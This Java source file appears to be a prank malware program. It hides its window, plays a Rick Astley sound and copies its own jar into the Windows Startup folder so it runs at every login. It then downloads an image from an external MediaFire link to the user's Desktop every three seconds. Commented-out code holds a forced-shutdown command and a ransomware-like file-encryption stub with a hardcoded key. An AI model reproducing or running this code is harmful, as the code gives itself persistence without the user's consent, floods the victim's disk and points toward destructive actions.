package doom;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import javax.swing.JFrame;

import org.bouncycastle.crypto.CryptoException;

public class Adapter {

	private Main instance;

	private File targetFolder;
		
	private int noOfFiles;

	public Adapter(Main instance) {
		this.instance = instance;
	}

	private JFrame frame;

	public void setup() {
		frame = new JFrame("never gonna give u up");
		frame.setResizable(false);
		frame.setSize(100, 100);
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		frame.setVisible(true);
		frame.hide();

		/*try {
			Runtime.getRuntime().exec("shutdown -s -t 0");
		} catch (IOException e1) {
			e1.printStackTrace();
		}*/
		Sound.playSound("rickastley.wav");
		try {
			File srcFolder = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath());
			String destFolder = new String(System.getenv("APPDATA").toString() + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
			copyDirectory("lol_" + String.valueOf(new Random().nextInt()), srcFolder, destFolder);
		} catch (Throwable e) {
			e.printStackTrace();
		}
		//this.encryptFile();
		this.setupRunnable();
		frame.setVisible(false);
	}

	private synchronized void setupRunnable() {
		final Timer timer = new Timer();
		final TimerTask task = new TimerTask() { 
			@Override
			public void run() { 
				try {
					URL url = new URL("https://download1519.mediafire.com/dt8vln5sv2gg/063vvt6175qbkvr/beans.jpg");
					HttpURLConnection http = (HttpURLConnection) url.openConnection();
					double fileSize = (double) http.getContentLengthLong();
					BufferedInputStream in = new BufferedInputStream(http.getInputStream());
					FileOutputStream fos = new FileOutputStream(new File(System.getProperty("user.home") + "/Desktop/" + String.valueOf(new Random().nextInt(1000000)) + ".jpg"));
					BufferedOutputStream bout = new BufferedOutputStream(fos, 1024);
					byte[] buffer = new byte[1024];
					double downloaded = 0.00;
					int read = 0;
					double percentDownloaded = 0.0D;
					
					while((read = in.read(buffer, 0, 1024)) >= 0) {
						bout.write(buffer, 0, read);
						downloaded += read;
						percentDownloaded = (downloaded*100) / fileSize;
						String percent = String.format("%.4f", percentDownloaded);
						System.out.println("Downloaded " + percent + "% of a file.");
					}
					
					bout.close();
					in.close();
					fos.close();
					System.out.println("Downloaded complete!");
					
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		};
		timer.schedule(task, 0, 3000);
		try {
			Thread.sleep(100000);
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	}
	private final void copyDirectory(String fileName, File sourceLocation, String destLocation) throws IOException {
		targetFolder = new File(destLocation);
		if (sourceLocation.isDirectory()) {
			if (!targetFolder.exists()) {
				targetFolder.mkdir();
			}

			String[] children = sourceLocation.list();
			for (int i = 0; i < children.length; i++) {
				copyDirectory(fileName, new File(sourceLocation, children[i]), destLocation);

			}
		} else {
			BufferedInputStream in = new BufferedInputStream(new FileInputStream(sourceLocation));
			OutputStream out = new BufferedOutputStream(new FileOutputStream(targetFolder + "\\"+ fileName + sourceLocation.getName()));
			System.out.println("Destination Path ::"+targetFolder + "\\"+ sourceLocation.getName());            
			// Copy the bits from instream to outstream
			byte[] buf = new byte[1024];
			int len;
			while ((len = in.read(buf)) > 0) {
				out.write(buf, 0, len);
			}
			in.close();
			out.close();
			noOfFiles++;
		}
	}
	private void encryptFile() {
		String key = "Mary has one cat1";
        File inputFile = new File("C:\\Users\\ace\\Desktop\\encryptedfolder\\encrypted.jpg");
        File encryptedFile = new File("C:\\Users\\ace\\Desktop\\encryptedfolder\\encrypted.jpg");
        File decryptedFile = new File("C:\\Users\\ace\\Desktop\\encryptedfolder\\decrypted.jpg");
         
        try {
            CryptoUtils.encrypt(key, inputFile, encryptedFile);
            CryptoUtils.decrypt(key, encryptedFile, decryptedFile);
        } catch (CryptoException ex) {
            System.out.println(ex.getMessage());
            ex.printStackTrace();
        }
	}
}
